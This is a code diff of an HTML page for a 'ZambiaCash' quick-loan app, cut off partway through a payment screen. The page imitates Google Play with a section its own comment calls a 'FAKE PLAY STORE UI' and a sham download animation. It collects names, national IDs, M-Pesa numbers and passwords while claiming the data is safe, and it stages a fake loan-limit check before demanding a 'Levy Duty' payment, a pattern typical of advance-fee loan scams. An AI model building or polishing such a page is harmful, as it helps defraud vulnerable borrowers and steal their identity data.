@@ -6,98 +6,246 @@
     <title>ZambiaCash - Apps on Google Play</title>
     <meta name="theme-color" content="#1E40AF">
     <link rel="manifest" href="manifest.json">
-    
-    <!-- Non-blocking Google Fonts for faster load -->
-    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap"></noscript>
-
-    <script src="https://cdn.tailwindcss.com"></script>
-    
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
-                        roboto: ['"Roboto"', 'sans-serif']
-                    },
-                    colors: {
-                        brandBlue: '#1E40AF',
-                        brandLight: '#3B82F6',
-                        brandYellow: '#F59E0B',
-                        playBlue: '#0056D2',
-                        playGreen: '#01875f',
-                    },
-                    boxShadow: {
-                        'soft': '0 10px 40px -10px rgba(0,0,0,0.08)',
-                        'glow': '0 0 20px rgba(59, 130, 246, 0.3)',
-                    }
-                }
-            }
-        }
-    </script>
     <style>
+        /* SYSTEM FONTS - INSTANT LOAD */
+        :root {
+            --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --brandBlue: #1E40AF;
+            --brandLight: #3B82F6;
+            --brandYellow: #F59E0B;
+            --playBlue: #0056D2;
+            --playGreen: #01875f;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: var(--font-sans); background: #fff; color: #0f172a; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+
+        /* UTILS */
         .hide { display: none !important; }
         .screen { display: none; flex-direction: column; min-height: 100vh; }
         .screen.active { display: flex; }
-        .gradient-bg { background: linear-gradient(135deg, #0F172A 0%, #1E40AF 100%); }
-        .glass-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
-        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; transition: all 0.2s; background: #F8FAFC; }
-        input:focus { border-color: #3B82F6; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
-        .amount-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
-        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30, 64, 175, 0.4); transform: translateY(-2px); }
-        .term-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
-        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 4px 12px rgba(30, 64, 175, 0.3); }
-        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .items-center { align-items: center; }
+        .items-start { align-items: flex-start; }
+        .justify-between { justify-content: space-between; }
+        .justify-center { justify-content: center; }
+        .justify-around { justify-content: space-around; }
+        .flex-1 { flex: 1 1 0%; }
+        .w-full { width: 100%; }
+        .w-px { width: 1px; }
+        .h-10 { height: 2.5rem; }
         
-        .star { color: #FBBF24; }
-        .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
+        /* TEXT */
+        .text-center { text-align: center; }
+        .text-xs { font-size: 0.75rem; line-height: 1rem; }
+        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+        .text-base { font-size: 1rem; line-height: 1.5rem; }
+        .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
+        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
+        .text-2xl { font-size: 1.5rem; line-height: 2rem; }
+        .text-5xl { font-size: 3rem; line-height: 1; }
+        .font-medium { font-weight: 500; }
+        .font-semibold { font-weight: 600; }
+        .font-bold { font-weight: 700; }
+        .font-extrabold { font-weight: 800; }
+        .leading-tight { line-height: 1.25; }
+        .leading-relaxed { line-height: 1.625; }
         
-        #download-ring { transition: stroke-dashoffset 0.1s linear; }
+        /* COLORS */
+        .text-gray-500 { color: #6b7280; }
+        .text-gray-600 { color: #4b5563; }
+        .text-gray-700 { color: #374151; }
+        .text-gray-800 { color: #1f2937; }
+        .text-gray-900 { color: #111827; }
+        .text-white { color: #ffffff; }
+        .text-playBlue { color: var(--playBlue); }
+        .text-playGreen { color: var(--playGreen); }
+        .text-brandYellow { color: var(--brandYellow); }
+        .text-emerald-500 { color: #10b981; }
+        .text-emerald-600 { color: #059669; }
+        .text-red-500 { color: #ef4444; }
+        .bg-white { background-color: #ffffff; }
+        .bg-gray-200 { background-color: #e5e7eb; }
+        .bg-playBlue { background-color: var(--playBlue); }
+        .bg-slate-800 { background-color: #1e293b; }
+        .bg-emerald-500 { background-color: #10b981; }
+        .bg-blue-100 { background-color: #dbeafe; }
+        .bg-blue-50 { background-color: #eff6ff; }
+        
+        /* BORDERS & SHADOWS */
+        .border { border: 1px solid #e5e7eb; }
+        .border-t { border-top: 1px solid #f3f4f6; }
+        .border-y { border-top: 1px solid #f3f4f6; border-bottom: 1px solid #f3f4f6; }
+        .border-gray-100 { border-color: #f3f4f6; }
+        .border-gray-200 { border-color: #e5e7eb; }
+        .border-gray-300 { border-color: #d1d5db; }
+        .border-gray-600 { border-color: #4b5563; }
+        .border-white\/20 { border-color: rgba(255,255,255,0.2); }
+        .rounded { border-radius: 0.25rem; }
+        .rounded-lg { border-radius: 0.5rem; }
+        .rounded-xl { border-radius: 0.75rem; }
+        .rounded-2xl { border-radius: 1rem; }
+        .rounded-3xl { border-radius: 1.5rem; }
+        .rounded-full { border-radius: 9999px; }
+        .shadow-sm { box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
+        .shadow-soft { box-shadow: 0 10px 40px -10px rgba(0,0,0,0.08); }
 
-        @keyframes toastIn { from { opacity: 0; transform: translate(-50%, 20px); } to { opacity: 1; transform: translate(-50%, 0); } }
-        @keyframes toastOut { from { opacity: 1; transform: translate(-50%, 0); } to { opacity: 0; transform: translate(-50%, 20px); } }
-        .native-toast { animation: toastIn 0.3s ease-out forwards; }
-        .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
+        /* SPACING */
+        .p-4 { padding: 1rem; }
+        .p-5 { padding: 1.25rem; }
+        .px-1\.5 { padding-left: 0.375rem; padding-right: 0.375rem; }
+        .px-2 { padding-left: 0.5rem; padding-right: 0.5rem; }
+        .px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
+        .px-4 { padding-left: 1rem; padding-right: 1rem; }
+        .px-5 { padding-left: 1.25rem; padding-right: 1.25rem; }
+        .py-1 { padding-top: 0.25rem; padding-bottom: 0.25rem; }
+        .py-1\.5 { padding-top: 0.375rem; padding-bottom: 0.375rem; }
+        .py-2\.5 { padding-top: 0.625rem; padding-bottom: 0.625rem; }
+        .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
+        .py-3\.5 { padding-top: 0.875rem; padding-bottom: 0.875rem; }
+        .py-5 { padding-top: 1.25rem; padding-bottom: 1.25rem; }
+        .pt-6 { padding-top: 1.5rem; }
+        .pt-8 { padding-top: 2rem; }
+        .pb-4 { padding-bottom: 1rem; }
+        .pb-20 { padding-bottom: 5rem; }
+        .mb-1 { margin-bottom: 0.25rem; }
+        .mb-2 { margin-bottom: 0.5rem; }
+        .mb-3 { margin-bottom: 0.75rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mb-5 { margin-bottom: 1.25rem; }
+        .mb-6 { margin-bottom: 1.5rem; }
+        .mb-8 { margin-bottom: 2rem; }
+        .mt-1 { margin-top: 0.25rem; }
+        .mt-2 { margin-top: 0.5rem; }
+        .mt-4 { margin-top: 1rem; }
+        .mt-8 { margin-top: 2rem; }
+        .gap-1 { gap: 0.25rem; }
+        .gap-2 { gap: 0.5rem; }
+        .gap-3 { gap: 0.75rem; }
+        .gap-4 { gap: 1rem; }
+        .space-y-2 > * + * { margin-top: 0.5rem; }
+        .space-y-5 > * + * { margin-top: 1.25rem; }
+        .space-y-7 > * + * { margin-top: 1.75rem; }
+
+        /* SIZING */
+        .w-2 { width: 0.5rem; }
+        .h-2 { height: 0.5rem; }
+        .w-3 { width: 0.75rem; }
+        .w-4 { width: 1rem; }
+        .w-5 { width: 1.25rem; }
+        .w-6 { width: 1.5rem; }
+        .w-9 { width: 2.25rem; }
+        .w-16 { width: 4rem; }
+        .w-20 { width: 5rem; }
+        .w-24 { width: 6rem; }
+        .w-44 { width: 11rem; }
+        .w-\[88px\] { width: 88px; }
+        .w-\[104px\] { width: 104px; }
+        .h-4 { height: 1rem; }
+        .h-5 { height: 1.25rem; }
+        .h-6 { height: 1.5rem; }
+        .h-9 { height: 2.25rem; }
+        .h-16 { height: 4rem; }
+        .h-20 { height: 5rem; }
+        .h-80 { height: 20rem; }
+        .h-\[88px\] { height: 88px; }
+        .h-\[104px\] { height: 104px; }
+
+        /* POSITIONING */
+        .fixed { position: fixed; }
+        .absolute { position: absolute; }
+        .relative { position: relative; }
+        .inset-0 { top: 0; right: 0; bottom: 0; left: 0; }
+        .sticky { position: sticky; }
+        .top-0 { top: 0; }
+        .bottom-0 { bottom: 0; }
+        .left-0 { left: 0; }
+        .right-0 { right: 0; }
+        .z-10 { z-index: 10; }
+        .z-50 { z-index: 50; }
+        .z-\[9999\] { z-index: 9999; }
+        .z-\[10000\] { z-index: 10000; }
+        .z-\[11000\] { z-index: 11000; }
+        .z-\[20000\] { z-index: 20000; }
+
+        /* EFFECTS */
+        .overflow-hidden { overflow: hidden; }
+        .overflow-x-auto { overflow-x: auto; }
+        .overflow-y-auto { overflow-y: auto; }
+        .object-cover { object-fit: cover; }
+        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .snap-x { scroll-snap-type: x mandatory; }
+        .snap-center { scroll-snap-align: center; }
+        .-rotate-90 { transform: rotate(-90deg); }
+        .transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 150ms; }
+        .active\:scale-95:active { transform: scale(0.95); }
+        .hover\:scale-110:hover { transform: scale(1.1); }
+        .cursor-pointer { cursor: pointer; }
+        .cursor-not-allowed { cursor: not-allowed; }
+        
+        /* MISC */
+        .max-w-lg { max-width: 32rem; }
+        .max-w-xs { max-width: 20rem; }
+        .max-w-sm { max-width: 24rem; }
+        .mx-auto { margin-left: auto; margin-right: auto; }
+        .backdrop-blur-md { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+        .bg-white\/90 { background-color: rgba(255, 255, 255, 0.9); }
+        
+        .gradient-bg { background: linear-gradient(135deg, #0F172A 0%, #1E40AF 100%); }
+        .glass-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
+        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; background: #F8FAFC; font-family: inherit; }
+        input:focus { border-color: #3B82F6; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
+        .amount-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; cursor: pointer; padding: 0.85rem 0; text-align: center; font-size: 0.9rem; }
+        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30, 64, 175, 0.4); transform: translateY(-2px); }
+        .term-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; cursor: pointer; padding: 0.75rem; flex: 1; text-align: center; font-size: 0.9rem; }
+        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 4px 12px rgba(30, 64, 175, 0.3); }
+
+        /* ANIMATIONS */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin { animation: spin 1s linear infinite; }
+        @keyframes pulse { 50% { opacity: .5; } }
+        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        
+        /* TOAST */
+        #android-toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 0.75rem 1.25rem; border-radius: 0.75rem; font-size: 0.85rem; font-weight: 500; z-index: 20000; text-align: center; opacity: 0; transition: opacity 0.3s; pointer-events: none; max-width: 90vw; line-height: 1.4; }
+        #android-toast.show { opacity: 1; }
     </style>
 </head>
-<body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
+<body>
 
     <!-- NATIVE ANDROID TOAST -->
-    <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] leading-snug">
-        Message goes here
-    </div>
+    <div id="android-toast">Message goes here</div>
 
     <!-- 0. OFFLINE GATE -->
-    <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-800 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
             <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
         </div>
-        <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
-        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">
+        <h2 class="text-2xl font-bold text-white mb-2">No Internet Connection</h2>
+        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto">
             ZambiaCash requires an active internet connection. Please turn on mobile data or Wi-Fi.
         </p>
-        <button onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform flex items-center justify-center gap-2">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+        <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform flex items-center justify-center gap-2">
             Retry
         </button>
     </div>
 
     <!-- 1. IN-APP BROWSER WARNING -->
-    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-800 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
             <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
         </div>
-        <h2 class="text-2xl font-bold text-white mb-2 font-sans">Action Required</h2>
-        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">
+        <h2 class="text-2xl font-bold text-white mb-2">Action Required</h2>
+        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto">
             To install ZambiaCash, you must open this page in Google Chrome.
         </p>
-        <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3 font-sans">Open in Chrome</button>
-        <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
+        <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3">Open in Chrome</button>
+        <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700">Copy Link</button>
     </div>
 
     <!-- 2. FAKE PLAY STORE UI -->
-    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
+    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20">
         
         <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
@@ -111,7 +259,7 @@
                         <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none" />
                         <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
                     </svg>
-                    <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover transition-all duration-300 z-0" alt="ZambiaCash Icon">
+                    <div id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 bg-brandBlue flex items-center justify-center text-white text-4xl font-extrabold z-0">Z</div>
                 </div>
                 
                 <div class="flex flex-col justify-center">
@@ -130,7 +278,7 @@
             </div>
 
             <div class="flex gap-2 mb-6" id="pre-install-buttons">
-                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
+                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-sm active:scale-95 transition-transform">Install</button>
             </div>
 
             <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
@@ -473,11 +621,10 @@
                         </div>
                     </div>
                 </div>
-
             </div>
         </div>
 
-        <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50 pb-safe">
+        <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50">
             <div class="flex flex-col items-center text-gray-500">
                 <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                 <span class="text-[10px] font-medium">Games</span>
@@ -495,166 +642,160 @@
         </div>
     </div>
 
-    <div id="app-content" class="hide font-sans">
-
+    <!-- APP CONTENT -->
+    <div id="app-content" class="hide">
+        
         <div id="screen-login" class="screen active gradient-bg p-6">
-            <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-                <div class="text-center mb-10">
-                    <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto backdrop-blur-md flex items-center justify-center border border-white/20 shadow-glow mb-6">
-                        <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover shadow-lg" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+            <div style="flex:1; display:flex; flex-direction:column; justify-content:center; max-width:24rem; margin:0 auto; width:100%;">
+                <div class="text-center mb-8">
+                    <div style="width:6rem; height:6rem; background:rgba(255,255,255,0.1); border-radius:1.5rem; margin:0 auto 1.5rem; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,0.2);">
+                        <span style="color:#fff; font-size:2.5rem; font-weight:bold;">Z</span>
                     </div>
-                    <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
-                    <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
+                    <h1 style="color:#fff; font-size:2rem; font-weight:800; letter-spacing:-0.025em;">ZambiaCash</h1>
+                    <p style="color:#bfdbfe; font-size:0.9rem; margin-top:0.5rem;">Quick loans in minutes</p>
                 </div>
                 
                 <div class="glass-card rounded-3xl p-6 shadow-2xl">
-                    <h2 class="text-xl font-bold text-slate-900 mb-5">Create Account</h2>
+                    <h2 class="font-bold mb-5" style="font-size:1.25rem; color:#0f172a;">Create Account</h2>
                     <div class="space-y-4">
                         <div><input type="text" id="in-name" placeholder="Full Name"></div>
                         <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
                         <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
                         <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
-                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg shadow-brandBlue/30 active:scale-95 transition-transform">Create Account</button>
+                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg active:scale-95 transition-transform">Create Account</button>
                     </div>
-                    <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
+                    <p class="text-center text-xs text-gray-500 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
                 </div>
             </div>
         </div>
 
-        <div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
-            <div class="w-28 h-28 bg-white/10 rounded-full flex items-center justify-center mb-8 animate-pulse border border-white/20">
-                <img src="icon.png" class="w-20 h-20 rounded-2xl object-cover">
+        <div id="screen-checking" class="screen gradient-bg p-6" style="align-items:center; justify-content:center;">
+            <div style="width:7rem; height:7rem; background:rgba(255,255,255,0.1); border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:2rem; border:1px solid rgba(255,255,255,0.2); animation:pulse 2s infinite;">
+                <span style="color:#fff; font-size:3rem; font-weight:bold;">Z</span>
             </div>
-            <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
-            <p id="check-status" class="text-blue-200 text-sm mb-8 font-medium">Analyzing your profile...</p>
-            <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-3 border border-white/10">
-                <div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100 shadow-[0_0_10px_#F59E0B]" style="width: 0%"></div>
+            <h2 style="color:#fff; font-size:1.5rem; font-weight:700; text-align:center; margin-bottom:0.5rem;">Checking your<br>loan limit</h2>
+            <p id="check-status" style="color:#bfdbfe; font-size:0.9rem; margin-bottom:2rem;">Analyzing your profile...</p>
+            <div style="width:100%; max-width:20rem; background:rgba(30,64,175,0.5); border-radius:9999px; height:0.75rem; margin-bottom:0.75rem; border:1px solid rgba(255,255,255,0.1);">
+                <div id="check-bar" style="background:#F59E0B; height:0.75rem; border-radius:9999px; width:0%; transition:width 0.1s;"></div>
             </div>
-            <p id="check-percent" class="text-white font-bold text-2xl">0%</p>
+            <p id="check-percent" style="color:#fff; font-weight:700; font-size:1.5rem;">0%</p>
         </div>
 
-        <div id="screen-select" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full">
-                <h2 class="text-2xl font-extrabold text-slate-900 mb-1">Choose your loan</h2>
-                <p class="text-sm text-slate-500 mb-6 font-medium">Tap an amount, then choose a term</p>
+        <div id="screen-select" class="screen p-6" style="background:#f8fafc;">
+            <div style="max-width:24rem; margin:0 auto; width:100%;">
+                <h2 style="font-size:1.5rem; font-weight:800; color:#0f172a; margin-bottom:0.25rem;">Choose your loan</h2>
+                <p style="font-size:0.9rem; color:#64748b; margin-bottom:1.5rem;">Tap an amount, then choose a term</p>
                 
-                <div class="grid grid-cols-3 gap-2.5 mb-8" id="amount-grid"></div>
+                <div id="amount-grid" style="display:grid; grid-template-columns:repeat(3, 1fr); gap:0.75rem; margin-bottom:2rem;"></div>
                 
-                <p class="font-bold text-slate-900 mb-3">Repayment term</p>
-                <div class="flex gap-2.5 mb-8">
-                    <button onclick="setTerm(30, this)" class="term-btn selected flex-1 py-3 text-sm">30 days</button>
-                    <button onclick="setTerm(60, this)" class="term-btn flex-1 py-3 text-sm">60 days</button>
-                    <button onclick="setTerm(90, this)" class="term-btn flex-1 py-3 text-sm">90 days</button>
+                <p class="font-bold mb-3" style="color:#0f172a;">Repayment term</p>
+                <div class="flex mb-8" style="gap:0.75rem;">
+                    <button onclick="setTerm(30, this)" class="term-btn selected">30 days</button>
+                    <button onclick="setTerm(60, this)" class="term-btn">60 days</button>
+                    <button onclick="setTerm(90, this)" class="term-btn">90 days</button>
                 </div>
                 
-                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-8 border border-slate-100">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">You receive</span><span id="sum-receive" class="font-extrabold text-brandBlue text-lg">Ksh 1,000</span></div>
-                    <div class="flex justify-between items-center">
-                        <span id="sum-interest-label" class="text-slate-500 font-medium text-sm">Interest (10%)</span>
-                        <span id="sum-interest" class="font-bold text-slate-800">Ksh 100</span>
-                    </div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
-                    <hr class="border-slate-100 my-2">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 1</span></div>
+                <div class="bg-white rounded-3xl p-6 shadow-soft mb-8" style="border:1px solid #e2e8f0; display:flex; flex-direction:column; gap:1rem;">
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">You receive</span><span id="sum-receive" style="color:#1E40AF; font-weight:800; font-size:1.1rem;">Ksh 1,000</span></div>
+                    <div class="flex justify-between items-center"><span id="sum-interest-label" style="color:#64748b; font-weight:500; font-size:0.9rem;">Interest (10%)</span><span id="sum-interest" style="font-weight:700; color:#0f172a;">Ksh 100</span></div>
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Total repayment</span><span id="sum-total" style="font-weight:700; color:#059669; font-size:1.1rem;">Ksh 1,100</span></div>
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Due date</span><span id="sum-due" style="font-weight:700; color:#0f172a;">--</span></div>
+                    <hr style="border:0; border-top:1px solid #f1f5f9; margin:0.5rem 0;">
+                    <div class="flex justify-between items-center"><span style="color:#64748b; font-weight:500; font-size:0.9rem;">Levy Duty</span><span id="sum-levy" style="font-weight:800; color:#F59E0B; font-size:1.1rem;">Ksh 1</span></div>
                 </div>
                 
-                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Continue</button>
+                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Continue</button>
             </div>
         </div>
 
-        <div id="screen-payment" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full">
+        <div id="screen-payment" class="screen p-6" style="background:#f8fafc;">
+            <div style="max-width:24rem; margin:0 auto; width:100%;">
                 <div class="flex items-center gap-3 mb-6">
-                    <button onclick="showScreen('screen-select')" class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-slate-700 active:scale-95"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg></button>
-                    <h2 class="text-xl font-extrabold text-slate-900">Levy Duty Payment</h2>
+                    <button onclick="showScreen('screen-select')" style="width:2.5rem; height:2.5rem; background:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 1px 2px rgba(0,0,0,0.05); border:none; cursor:pointer; color:#334155;">
